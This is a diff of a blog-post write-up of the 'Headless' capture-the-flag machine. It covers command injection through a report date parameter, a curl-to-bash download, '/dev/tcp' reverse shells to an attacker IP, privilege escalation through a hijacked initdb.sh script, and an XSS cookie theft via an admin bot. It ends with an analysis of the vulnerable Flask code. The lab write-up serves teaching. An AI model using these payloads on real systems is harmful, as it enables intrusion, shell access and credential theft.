@@ -36,7 +36,7 @@ PORT     STATE SERVICE VERSION
 {% endhighlight %}
 </div>
 
-We can't SSH into the machine without a password so let's check port 5000 first. The nmap returns a GET HTTP with an `is_admin` cookie set, so let's take a look at the website.
+We can't SSH into the machine without a password so let's check port 5000. The nmap returns a GET HTTP with an `is_admin` cookie set, so let's take a look at the website.
 
 <div class="article-image">
   <img src="/assets/img/headless/homepage.png">
@@ -159,7 +159,7 @@ And once we send the request we get the following.
 
 Considering we only get a simple message when generating reports, it means that there's not much we can try. The fact that the message says "Systems are up..." suggests that commands are being run on the system when clicking on the button.
 
-I tried different combinations of commands to get a reverse shell and `curl` alongside a pipeline with `bash` is what ended up working. So let's go through the setup.
+I tried different combinations of commands to get a reverse shell and `curl` alongside a pipe to `bash` is what ended up working. So let's go through the setup.
 
 First, create a script with a reverse shell command.
 
@@ -188,7 +188,7 @@ listening on [any] 7777 ...
 {% endhighlight %}
 </div>
 
-Finally, append a `curl` command to our burpsuite request and pipeline it to `bash`.
+Finally, append a `curl` command to our burpsuite request and pipe to `bash`.
 
 <div class="article-image">
   <img src="/assets/img/headless/dashboardrequest.png">
@@ -208,8 +208,7 @@ Now we can easily find the user.txt flag by doing one simple command.
 
 <div class="article-code">
 {% highlight sh %}
-jeanp@~$ nc -lvp 7777
-listening on [any] 7777 ...
+find / -name user.txt 2>/dev/null
 {% endhighlight %}
 </div>
 
@@ -261,7 +260,7 @@ exit 0
 <p>syscheck</p>
 </div>
 
-The first line of this script `if [ "$EUID" -ne 0 ]; then exit 1; fi` checks if the user that's running syscheck is root, if its not then it exits.
+The first line of this script `if [ "$EUID" -ne 0 ]; then exit 1; fi` checks if the user that's running syscheck is root, if its not it exits.
 
 The next lines are not of much importance, the script just assings values to variables that are then printed to the console.
 
@@ -280,7 +279,7 @@ This is the section that is of major interest.
 
 - This block checks if the `initdb.sh` process is running using the `pgrep` command.
 
-- If the process is not found (`pgrep` returns a non-zero exit code), it means the database service is not running.
+- If the process is not found, it means the database service is not running.
 
 - In that case, it prints a message indicating that the database service is not running and starts it by executing the `./initdb.sh` script, redirecting stderr to `/dev/null`.
 
@@ -296,6 +295,12 @@ Usually the /usr/bin directory is in PATH, which means any script stored inside 
 
 So let's create an initdb.sh file to get a root shell. My first idea was to assign the setuid bit to /bin/bash.
 
+<div class="article-code">
+{% highlight sh %}
+echo "chmod u+s /bin/bash" > initdb.sh
+{% endhighlight %}
+</div>
+
 <div class="article-image">
   <img src="/assets/img/headless/setuid.png">
 </div>
@@ -310,7 +315,7 @@ echo "bash -i >& /dev/tcp/10.10.14.142/7777 0>&1" > initdb.sh
 {% endhighlight %}
 </div>
 
-And make the script executable.
+Make the script executable.
 
 <div class="article-code">
 {% highlight sh %}
@@ -340,7 +345,7 @@ We get the shell and the root flag.
 
 It's always important to not only know how to exploit applications, but to also understand why and where they are vulnerable to provide better security.
 
-If we list the home directory of the vulnerable machine we find the `app.py` file that's responsible for launching the vulnerable website on port 5000.
+If we list the home directory of the machine, we find the `app.py` file that's responsible for launching the vulnerable website on port 5000.
 
 Let's inspect the vulnerable sections of this code from top to bottom. I added some comments to make it more clear.
 
@@ -377,6 +382,7 @@ def index():
 
     return response
 {% endhighlight %}
+<p>app.py</p>
 </div>
 
 From this block we can see where the cookies are coming from and how they are being generated. We can add some code to print both the user and admin cookies.
@@ -426,100 +432,128 @@ def admin():
 
     return render_template('dashboard.html', script_output=script_output)
 {% endhighlight %}
+<p>app.py</p>
 </div>
 
-`os.popen(f'bash report.sh {date}').read()`. It's not a good idea to pass input to a shell without sanitizing it first. It makes sense now why passing `date=2023-09-15;curl http://10.10.14.142:8000/script.sh | bash` in the payload works to get a reverse shell going. This payload translates to `bash report.sh 2023-09-15;curl http://10.10.14.142:8000/script.sh | bash`.
 
+<div class="article-code">
+{% highlight sh %}
 
+{% endhighlight %}
+</div>
 
+`os.popen(f'bash report.sh {date}').read()`. It's not a good idea to pass input to a shell without sanitizing it first. It makes sense now why passing `date=2023-09-15;curl http://10.10.14.142:8000/script.sh | bash` in the payload works to get a reverse shell going. This payload translates to:
 
 
+<div class="article-code">
+{% highlight sh %}
+dvir@headless:~$ bash report.sh 2023-09-15;curl http://10.10.14.142:8000/script.sh | bash
+{% endhighlight %}
+</div>
 
+Another thing to point out is that we can't directly skip hosting a file in our computer and not use curl to pipe the contents to bash. This is because the code doesn't keep our shell open if we do something like the following in the payload:
 
+<div class="article-code">
+{% highlight sh %}
+date=2023-09-15;bash -i >& /dev/tcp/10.10.14.142/7777 0>&1
+{% endhighlight %}
+</div>
 
+The reason is, the `read()` method is called on the file object returned by `os.popen()`. This reads the entire output of the command until the end of the stream is reached.
 
+After `read()` finishes, the pipe is automatically closed because there is no more data to read from the stream. The shell process associated with the command also exits at this point.
 
+<div class="article-code">
+{% highlight python %}
+@app.route('/support', methods=['GET', 'POST'])
+def support():
+    if request.method == 'POST':
+        message = request.form.get('message')
+        # Get the headers of the request when this condition hits
+        {% raw %}if ("<" in message and ">" in message) or ("{{" in message and "}}" in message):{% endraw %}
+            request_info = {
+                "Method": request.method,
+                "URL": request.url,
+                "Headers": format_request_info(dict(request.headers)),
+            }
 
+            formatted_request_info = format_request_info(request_info)
+            html = render_template('hackattempt.html', request_info=formatted_request_info)
 
+            # Create an html file in the specified path that holds the information of the request headers
+            filename = f'{random.randint(1, 99999999999999999999999)}.html'
+            with open(os.path.join(hacking_reports_dir, filename), 'w', encoding='utf-8') as html_file:
+                html_file.write(html)
 
+            return html
 
+    return render_template('support.html')
+{% endhighlight %}
+<p>app.py</p>
+</div>
 
+For the form at /support the value of the message box is checked against the condition `if ("<" in message and ">" in message) or ("{{" in message and "}}" in message):`. This explains why using `<script>` returns the `hackattempt.html` page.
 
+We must remember that the headers of the request are sent to administrators. When we send the fetch script, it's stored inside the `hacking_reports` directory. This is how one of these html report files looks like for the administrator with our script attached:
 
+<div class="article-image">
+  <img src="/assets/img/headless/hackreport.png">
+  <p>hacking_report.html</p>
+</div>
 
+Now the only thing that's left unknown is... Who's the administrator?
 
+To answer this question we have to take a peek at the `inspect_reports.py` file in the home directory. 
 
+<div class="article-code">
+{% highlight python %}
+def extract_number(filename):
+    return os.path.splitext(filename)[0]
 
+options = webdriver.FirefoxOptions()
+options.add_argument('--headless')
+driver = webdriver.Firefox(options=options)
+driver.set_page_load_timeout(5)
 
+while True:
+    login_url = "http://localhost:5000/"
 
+    html_directory = "/home/dvir/app/hacking_reports"
 
+    # Check every html report in the hacking_reports directory
+    html_files = [f for f in os.listdir(html_directory) if f.endswith(".html")]
 
+    base_url = "http://localhost:5000/hacking_reports/"
 
+    for html_file in html_files:
+        number = extract_number(html_file)
+        url = base_url + number
 
+        print(f"Trying: {url}")
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+        try:
+            # Sets the admin cookie to the Firefox web driver because the request comes from localhost
+            driver.get(login_url)
+            # With the admin cookie now set the driver navigates to the url where our request headers are
+            driver.get(url)
+            time.sleep(2)
+        except Exception as e:
+            print(f"Error: {e}")
+            pass
+        os.remove("/home/dvir/app/hacking_reports/" + html_file)
+    time.sleep(60)
+{% endhighlight %}
+<p>inspect_reports.py</p>
+</div>
+
+The Firefox web driver navigates to `http://localhost:5000/` first, this gives it the admin cookie, why? because remember if the request made to the application comes from localhost, the cookie that's going to be set is the admin's, not the user's. Here's the relevant snippet of code again:
+
+<div class="article-code">
+{% highlight python %}
+is_admin = True if client_ip in ['127.0.0.1', '::1'] else False
+token = "admin" if is_admin else "user"
+{% endhighlight %}
+<p>app.py</p>
+</div>
+
+The web driver then navigates to `http://localhost:5000/hacking_reports/<int:report_number>`where our script to steal cookies is stored, and successfully sends it over to our python server.
